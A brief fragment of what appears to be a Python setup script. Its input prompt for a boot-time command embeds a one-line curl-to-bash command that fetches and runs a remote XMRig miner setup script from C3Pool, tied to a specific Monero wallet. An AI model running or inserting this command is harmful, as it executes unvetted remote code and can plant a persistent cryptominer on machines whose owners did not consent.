...
# 3.创建开机后要运行的脚本
init = input("请输入机器开机后要执行的命令（仅一行）:  export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4B6o2FniKyyaaBMAaF15unJeShUzryxBTRoG7Ea29oP67fy1QjX1Nm2XF4oF73tzFmcBgFACbbqQ8WVvsHMNpSRn5n7fJd2")
